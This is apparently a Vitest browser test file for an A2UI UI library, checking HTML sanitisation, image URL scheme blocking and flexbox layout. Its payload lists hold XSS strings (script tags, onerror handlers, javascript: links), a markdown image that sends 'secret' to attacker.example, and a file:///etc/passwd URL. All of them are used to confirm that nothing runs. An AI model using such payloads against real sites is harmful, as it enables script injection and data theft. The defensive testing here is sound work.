import { afterEach, describe, expect, it } from "vitest";
import { A2UI_STYLES } from "../../src/a2ui/a2ui_styles.js";
import { drawSurface } from "../helpers/a2ui_surface.js";

/**
 * The display components' sanitisation, URL safety and layout, asserted in
 * Chromium: DOMPurify sanitises nothing under happy-dom, and happy-dom
 * computes no layout.
 */
afterEach(() => {
  document.body.replaceChildren();
  document.head.querySelector("style[data-a2ui-test]")?.remove();
});

function styled(): void {
  const style = document.createElement("style");
  style.dataset["a2uiTest"] = "";
  style.textContent = A2UI_STYLES;
  document.head.append(style);
}

const PAYLOADS = [
  "<script>window.__a2uiPwned = 1</script>hello",
  '<img src="x" onerror="window.__a2uiPwned = 1">',
  '<a href="javascript:window.__a2uiPwned = 1">click</a>',
  '<div onclick="window.__a2uiPwned = 1" style="position:fixed">x</div>',
  '<iframe src="https://example.com"></iframe>',
  "<svg><script>window.__a2uiPwned = 1</script></svg>",
  "[link](javascript:window.__a2uiPwned=1) ![img](https://attacker.example/?d=secret)",
];

describe("Text sanitisation (real browser)", () => {
  it("never puts raw HTML, a handler, a script or an image in the DOM", () => {
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Column", children: PAYLOADS.map((_, i) => `t${i}`) },
        ...PAYLOADS.map((text, i) => ({ id: `t${i}`, component: "Text", text })),
      ],
    });
    const html = drawn.node.innerHTML;
    for (const tag of ["script", "img", "iframe", "svg", "[style]", "[onclick]", "[onerror]"]) {
      expect(drawn.node.querySelectorAll(`[part="a2ui-text"] ${tag}`)).toHaveLength(0);
    }
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/\son[a-z]+=/i);
    expect((window as { __a2uiPwned?: number }).__a2uiPwned).toBeUndefined();
    expect(drawn.byId("t0").textContent).toBe("hello");
  });

  it("stays sanitised when a bound value changes to a payload", () => {
    const drawn = drawSurface({
      components: [{ id: "root", component: "Text", text: { "@path": "/t" } }],
      data: { t: "**safe**" },
    });
    expect(drawn.byId("root").querySelector("strong")?.textContent).toBe("safe");
    drawn.model.set("/t", '<img src="x" onerror="window.__a2uiPwned = 1">');
    expect(drawn.byId("root").querySelector("img")).toBeNull();
  });
});

describe("Image URL safety (real browser)", () => {
  const UNSAFE = [
    "javascript:alert(1)",
    " JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "data:application/javascript,alert(1)",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
    "blob:https://example.com/0",
    "ftp://example.com/a.png",
    "",
    "   ",
  ];

  it("draws nothing loadable for a script, a non-image data url or another scheme", () => {
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Row", children: UNSAFE.map((_, i) => `i${i}`) },
        ...UNSAFE.map((url, i) => ({ id: `i${i}`, component: "Image", url })),
      ],
    });
    UNSAFE.forEach((_, i) => {
      const image = drawn.byId(`i${i}`) as HTMLImageElement;
      expect(image.hasAttribute("src")).toBe(false);
      expect(image.currentSrc).toBe("");
      expect(getComputedStyle(image).display).toBe("none");
    });
  });

  it("loads an https url and a data image", () => {
    styled();
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Row", children: ["a", "b"] },
        { id: "a", component: "Image", url: "https://example.com/a.png" },
        {
          id: "b",
          component: "Image",
          url: "data:image/gif;base64,R0lGODlhAQABAAAAACw=",
          variant: "avatar",
        },
      ],
    });
    expect(drawn.byId("a").getAttribute("src")).toBe("https://example.com/a.png");
    expect(drawn.byId("b").getAttribute("src")).toMatch(/^data:image\/gif/);
    expect(getComputedStyle(drawn.byId("b")).borderRadius).toBe("50%");
    expect(getComputedStyle(drawn.byId("b")).width).toBe("40px");
  });
});

describe("Display layout (real browser)", () => {
  it("maps justify, align and direction to flexbox", () => {
    styled();
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Column", children: ["row", "list"], justify: "spaceBetween" },
        { id: "row", component: "Row", children: ["i1"], justify: "spaceEvenly", align: "end" },
        { id: "list", component: "List", children: [], direction: "horizontal", align: "center" },
        { id: "i1", component: "Icon", name: "add" },
      ],
    });
    const column = getComputedStyle(drawn.byId("root"));
    expect(column.display).toBe("flex");
    expect(column.flexDirection).toBe("column");
    expect(column.justifyContent).toBe("space-between");
    expect(column.alignItems).toBe("stretch");
    const row = getComputedStyle(drawn.byId("row"));
    expect(row.flexDirection).toBe("row");
    expect(row.justifyContent).toBe("space-evenly");
    // Newer Chromium serialises flex-end as its box-alignment name, flow-end.
    expect(row.alignItems).toMatch(/^(flex|flow)-end$/);
    const list = getComputedStyle(drawn.byId("list"));
    expect(list.flexDirection).toBe("row");
    expect(list.overflowX).toBe("auto");
    expect(list.alignItems).toBe("center");
    const icon = drawn.byId("i1");
    expect(icon.getBoundingClientRect().width).toBe(24);
    expect(icon.querySelector("svg")?.getBoundingClientRect().height).toBe(24);
  });

  it("draws a vertical divider one pixel wide across a row's height", () => {
    styled();
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Row", children: ["a", "v", "b"] },
        { id: "a", component: "Text", text: "one\n\ntwo" },
        { id: "v", component: "Divider", axis: "vertical" },
        { id: "b", component: "Text", text: "three" },
      ],
    });
    const divider = drawn.byId("v").getBoundingClientRect();
    expect(divider.width).toBe(1);
    expect(divider.height).toBe(drawn.byId("root").getBoundingClientRect().height);
  });

  it("draws a horizontal divider one pixel tall across a column's width", () => {
    styled();
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Column", children: ["a", "h"] },
        { id: "a", component: "Text", text: "one" },
        { id: "h", component: "Divider" },
      ],
    });
    const divider = drawn.byId("h").getBoundingClientRect();
    expect(divider.height).toBe(1);
    expect(divider.width).toBe(drawn.byId("root").getBoundingClientRect().width);
  });

  it("keeps a markdown paragraph from adding margins inside a row", () => {
    styled();
    const drawn = drawSurface({
      components: [
        { id: "root", component: "Row", children: ["a"] },
        { id: "a", component: "Text", text: "Apple" },
      ],
    });
    const paragraph = drawn.byId("a").querySelector("p");
    expect(paragraph).not.toBeNull();
    expect(getComputedStyle(paragraph as HTMLElement).marginTop).toBe("0px");
    expect(getComputedStyle(paragraph as HTMLElement).marginBottom).toBe("0px");
  });
});
